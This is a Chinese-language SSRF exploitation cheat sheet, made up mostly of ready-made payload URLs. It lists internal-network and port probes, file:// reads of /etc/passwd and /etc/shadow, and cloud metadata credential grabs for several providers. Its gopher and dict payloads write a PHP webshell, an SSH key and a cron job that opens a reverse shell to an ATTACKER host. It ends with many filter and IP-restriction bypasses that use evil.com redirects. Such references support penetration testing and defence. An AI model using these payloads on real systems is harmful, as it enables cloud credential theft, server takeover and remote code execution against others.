# SSRF (Server-Side Request Forgery)

## 原理

服务端根据用户输入发起网络请求，攻击者构造恶意 URL 让服务器访问内网资源、云服务元数据、本地服务，从而读取敏感信息、攻击内网服务、甚至 RCE。

## 攻击链

### 1. 寻找注入点

- URL 参数：`url=`、`target=`、`host=`、`path=`、`fetch=`、`source=`
- 图片代理、PDF 生成、网页截图、爬虫功能
- Webhook 配置、回调 URL
- 文件导入（从 URL 导入）
- RSS/Atom feed 解析
- OAuth 回调 URL

### 2. 探测内网

```http
# 经典内网探测
?url=http://127.0.0.1/
?url=http://localhost/
?url=http://192.168.1.1/
?url=http://10.0.0.1/
?url=http://172.16.0.1/

# 探测端口
?url=http://127.0.0.1:22/    # SSH
?url=http://127.0.0.1:3306/  # MySQL
?url=http://127.0.0.1:6379/  # Redis
?url=http://127.0.0.1:9200/  # Elasticsearch
?url=http://127.0.0.1:8080/  # 各种 Web 服务
```

### 3. 读取本地文件

```http
?url=file:///etc/passwd
?url=file:///etc/shadow
?url=file:///proc/self/environ
?url=file:///proc/self/cmdline
?url=file:///proc/self/status
?url=file:///var/www/html/config.php
?url=file:///C:/Windows/win.ini     # Windows
```

### 4. 云服务元数据

#### AWS EC2

```http
# 旧版（IMDSv1，直接访问）
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>/
?url=http://169.254.169.254/latest/user-data

# 获取临时凭证
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>/
# 返回 AccessKeyId, SecretAccessKey, Token

# IMDSv2（需要 Token，SSRF 难以利用）
# 但如果应用本身用 IMDSv2，且 SSRF 可控 header，则可绕过
```

#### GCP

```http
?url=http://metadata.google.internal/computeMetadata/v1/
?url=http://169.254.169.254/computeMetadata/v1/
# 需要 Metadata-Flavor: Google header
# /computeMetadata/v1/instance/service-accounts/default/token
# /computeMetadata/v1/instance/attributes/
```

#### Azure

```http
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
# 需要 Metadata: true header
```

#### Alibaba Cloud

```http
?url=http://100.100.100.200/latest/meta-data/
?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

#### Tencent Cloud

```http
?url=http://metadata.tencentyun.com/latest/meta-data/
```

### 5. 攻击内网服务

#### Redis 未授权

```http
# 通过 dict:// 或 gopher:// 写 Webshell / SSH key / 计划任务
?url=dict://127.0.0.1:6379/INFO
?url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
?url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20shell.php
?url=dict://127.0.0.1:6379/SET%20x%20%3C%3Fphp%20eval(%24_POST%5Bcmd%5D)%3F%3E
?url=dict://127.0.0.1:6379/SAVE
```

#### gopher 协议攻击 Redis

```
# 写 Webshell
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3Fphp%20eval(%24_POST%5B'cmd'%5D)%3F%3E%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# 写 SSH 公钥
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$372%0d%0a%0a%0a%0assh-rsa AAAA...%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# 写计划任务（CentOS）
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$14%0d%0a/var/spool/cron%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

#### MySQL 未授权

```
# gopher 协议攻击 MySQL（无密码）
# 使用 Gopherus 生成 payload
gopher://127.0.0.1:3306/_<payload>
```

#### FastCGI 攻击

```
# gopher 协议攻击 FastCGI
gopher://127.0.0.1:9000/_<payload>
# 使用 Gopherus 生成
```

### 6. 协议利用

```http
# 各种协议
?url=http://evil.com/         # HTTP
?url=https://evil.com/        # HTTPS
?url=file:///etc/passwd       # file
?url=ftp://evil.com/file      # FTP
?url=dict://127.0.0.1:6379/INFO  # dict
?url=gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a  # gopher
?url=tftp://evil.com/file     # TFTP
?url=ldap://127.0.0.1/        # LDAP
?url=sftp://evil.com/         # SFTP
?url=telnet://127.0.0.1:23/   # Telnet
```

## 绕过技巧

### 1. IP 限制绕过

```http
# 短链接
?url=http://dwz.cn/xxxxx

# DNS Rebinding
# 注册一个域名，TTL 设为 0，第一次解析到外网 IP，第二次解析到 127.0.0.1
?url=http://rebind.attacker.com/

# 十进制 IP
?url=http://2130706433/        # 127.0.0.1 的十进制
?url=http://0x7f000001/        # 十六进制
?url=http://017700000001/      # 八进制

# 进制混合
?url=http://127.0.0.1/
?url=http://127.1/
?url=http://127/
?url=http://0/
?url=http://0x7f.0x0.0x0.0x1/
?url=http://0177.0.0.1/
?url=http://2130706433/

# IPv6
?url=http://[::1]/
?url=http://[0:0:0:0:0:0:0:1]/
?url=http://[::ffff:127.0.0.1]/
?url=http://[0:0:0:0:0:ffff:7f00:1]/

# 特殊域名
?url=http://localhost/
?url=http://localtest.me/      # 解析到 127.0.0.1
?url=http://spoofed.burpcollaborator.net/
?url=http://customer1.app.localhost.my.company.127.0.0.1.nip.io/

# 302 跳转
# 在自己服务器上放一个跳转脚本
?url=http://evil.com/redirect.php
# redirect.php: <?php header("Location: http://127.0.0.1/"); ?>

# DNS rebinding 服务
?url=http://7f000001.7f000001.rbndr.us/
```

### 2. 协议限制绕过

```http
# 只允许 http://，但想读文件
# 通过 302 跳转
?url=http://evil.com/redir.php
# redir.php: <?php header("Location: file:///etc/passwd"); ?>

# 通过 @ 符号
?url=http://evil.com@127.0.0.1/
# 实际访问 127.0.0.1，evil.com 作为用户名

# 通过 #
?url=http://evil.com#@127.0.0.1/
```

### 3. 关键字过滤

```http
# 过滤 127.0.0.1
?url=http://127.1/
?url=http://127.0.0.1.nip.io/
?url=http://0/
?url=http://localhost/

# 过滤 localhost
?url=http://127.0.0.1/
?url=http://[::1]/

# 过滤 http
?url=gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a

# 过滤 .com
?url=http://127.0.0.1/
```

### 4. 云元数据 IMDSv2 绕过

```http
# IMDSv2 需要 PUT 请求获取 token
# 如果 SSRF 支持 PUT，可获取 token 后访问
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600

# 然后带 token 访问
GET /latest/meta-data/iam/security-credentials/role-name/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: <token>
```

### 5. 通过 gopher 发送任意 TCP 数据

```
# gopher 可以发送任意 TCP 数据
# 格式：gopher://host:port/_<URL编码的数据>
# 每个数据前加 _，换行用 %0d%0a

# 发送 HTTP 请求
gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a

# 发送 Redis 命令
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a
```

## 2024-2026 新技术点

### 1. AWS IMDSv2 绕过

```http
# 某些 SDK 在使用 IMDSv2 时存在缺陷
# 通过 SSRF + PUT 请求获取 token
# 然后带 token 访问元数据

# 新发现的绕过：
# 1. 某些代理服务会自动添加 X-aws-ec2-metadata-token 头
# 2. 通过 hop-by-hop header 操纵
```

### 2. Kubernetes API Server SSRF

```http
# 如果 SSRF 在 k8s pod 内
?url=https://kubernetes.default.svc/api/v1/namespaces/default/pods
# 通过 ServiceAccount token 访问
# token 在 /var/run/secrets/kubernetes.io/serviceaccount/token
```

### 3. Docker Socket SSRF

```http
# 如果应用挂载了 docker.sock
?url=unix:///var/run/docker.sock:/containers/json
# 通过 SSRF + unix socket 操控 Docker
```

### 4. GCP 新元数据端点

```http
# GCP 新增的端点
?url=http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/
# 需要 Metadata-Flavor: Google header
```

### 5. Cloudflare Workers SSRF

```javascript
# Cloudflare Workers 中的 SSRF
# 通过 fetch() API
# 可访问 Cloudflare 内部服务
```

### 6. HTTP/2 SSRF

```http
# HTTP/2 的 SSRF 有新特性
# 通过 :authority 伪头绕过 Host 检查
# 通过 HTTP/2 连接合并绕过
```

### 7. WebAssembly SSRF

```http
# WASM 模块发起的请求可能绕过同源策略
# 通过 WASM 中的 fetch 实现跨域 SSRF
```

### 8. Server-Side Prototype Pollution + SSRF

```javascript
# 通过原型链污染修改 fetch 行为
# Object.prototype.headers = {'X-Forwarded-For': '127.0.0.1'}
```

### 9. URL Parser 差异

```http
# 不同语言 URL 解析器差异
# Python urllib vs requests vs Go net/url vs Node.js url
# 利用解析差异绕过白名单

# 例：http://evil.com\@127.0.0.1/
# 不同解析器对 @ 的处理不同
```

### 10. 盲 SSRF 检测

```http
# 通过 DNS 反查检测盲 SSRF
?url=http://<random>.burpcollaborator.net/
?url=http://<random>.oast.fun/

# 通过响应时间判断
?url=http://127.0.0.1:8080/  # 开放则快，关闭则慢
```

## 工具推荐

- **Gopherus** — 生成 gopher 协议 payload（Redis/MySQL/FastCGI）
- **SSRFmap** — SSRF 自动化利用
- **SSRF-King** — Burp 插件
- **collaborator everywhere** — Burp 插件，盲 SSRF 检测
- **interactsh** — 自建 OOB 服务器

## 参考链接

- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [SSRF Bible](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBqLUOQv0P2c0MAHm2V9ZbAwp8M/edit)
